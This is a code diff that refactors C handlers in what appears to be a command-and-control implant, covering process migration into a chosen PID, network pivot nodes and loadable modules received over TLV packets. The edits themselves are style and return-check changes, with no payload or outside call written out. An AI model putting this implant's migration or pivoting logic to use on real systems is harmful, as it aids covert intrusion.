@@ -64,8 +64,10 @@ static tlv_pkt_t *builtin_quit(c2_t *c2)
 
 static tlv_pkt_t *builtin_add_node(c2_t *c2)
 {
-    ipv4_t src_host, dst_host;
-    port_t src_port, dst_port;
+    ipv4_t src_host;
+    ipv4_t dst_host;
+    port_t src_port;
+    port_t dst_port;
 
     tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_NODE_SRC_ADDR, &src_host);
     tlv_pkt_get_ushort(c2->tlv_pkt, TLV_TYPE_NODE_SRC_PORT, &src_port);
@@ -73,7 +75,7 @@ static tlv_pkt_t *builtin_add_node(c2_t *c2)
     tlv_pkt_get_ushort(c2->tlv_pkt, TLV_TYPE_NODE_DST_PORT, &dst_port);
 
     if (node_add(&c2->dynamic.nodes, c2->dynamic.n_count, \
-        src_host, src_port, dst_host, dst_port) == 0)
+        src_host, src_port, dst_host, dst_port) >= 0)
     {
         tlv_pkt_t *result = api_craft_tlv_pkt(API_CALL_SUCCESS);
         tlv_pkt_add_int(result, TLV_TYPE_NODE_ID, c2->dynamic.n_count);
@@ -86,9 +88,10 @@ static tlv_pkt_t *builtin_add_node(c2_t *c2)
 static tlv_pkt_t *builtin_delete_node(c2_t *c2)
 {
     int node_id;
+
     tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_NODE_ID, &node_id);
 
-    if (node_delete(&c2->dynamic.nodes, node_id) == 0)
+    if (node_delete(&c2->dynamic.nodes, node_id) >= 0)
         return api_craft_tlv_pkt(API_CALL_SUCCESS);
 
     return api_craft_tlv_pkt(API_CALL_FAIL);
@@ -97,15 +100,17 @@ static tlv_pkt_t *builtin_delete_node(c2_t *c2)
 static tlv_pkt_t *builtin_add_tab(c2_t *c2)
 {
     int tab_size;
+    unsigned char *tab;
+
     tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_TAB_SIZE, &tab_size);
 
-    unsigned char *tab = malloc(tab_size);
+    tab = malloc(tab_size);
 
     if (tab != NULL)
     {
-        if (tlv_pkt_get_bytes(c2->tlv_pkt, TLV_TYPE_TAB, tab) == 0)
+        if (tlv_pkt_get_bytes(c2->tlv_pkt, TLV_TYPE_TAB, tab) >= 0)
         {
-            if (tab_add(&c2->dynamic.tabs, c2->dynamic.t_count, tab) == 0)
+            if (tab_add(&c2->dynamic.tabs, c2->dynamic.t_count, tab) >= 0)
             {
                 tlv_pkt_t *result = api_craft_tlv_pkt(API_CALL_SUCCESS);
                 tlv_pkt_add_int(result, TLV_TYPE_TAB_ID, c2->dynamic.t_count);
@@ -121,9 +126,10 @@ static tlv_pkt_t *builtin_add_tab(c2_t *c2)
 static tlv_pkt_t *builtin_delete_tab(c2_t *c2)
 {
     int tab_id;
+
     tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_TAB_ID, &tab_id);
 
-    if (tab_delete(&c2->dynamic.tabs, tab_id) == 0)
+    if (tab_delete(&c2->dynamic.tabs, tab_id) >= 0)
         return api_craft_tlv_pkt(API_CALL_SUCCESS);
 
     return api_craft_tlv_pkt(API_CALL_FAIL);
@@ -133,17 +139,18 @@ static tlv_pkt_t *builtin_migrate(c2_t *c2)
 {
     int migrate_size;
     pid_t migrate_pid;
+    unsigned char *migrate;
 
     tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_MIGRATE_SIZE, &migrate_size);
     tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_MIGRATE_PID, &migrate_pid);
 
-    unsigned char *migrate = malloc(migrate_size);
+    migrate = malloc(migrate_size);
 
     if (migrate != NULL)
     {
-        if (tlv_pkt_get_bytes(c2->tlv_pkt, TLV_TYPE_MIGRATE, migrate) == 0)
+        if (tlv_pkt_get_bytes(c2->tlv_pkt, TLV_TYPE_MIGRATE, migrate) >= 0)
         {
-            if (migrate_init(c2, migrate_pid, migrate_size, migrate) == 0)
+            if (migrate_init(c2, migrate_pid, migrate_size, migrate) >= 0)
             {
                 free(migrate);
                 return api_craft_tlv_pkt(API_CALL_QUIT);
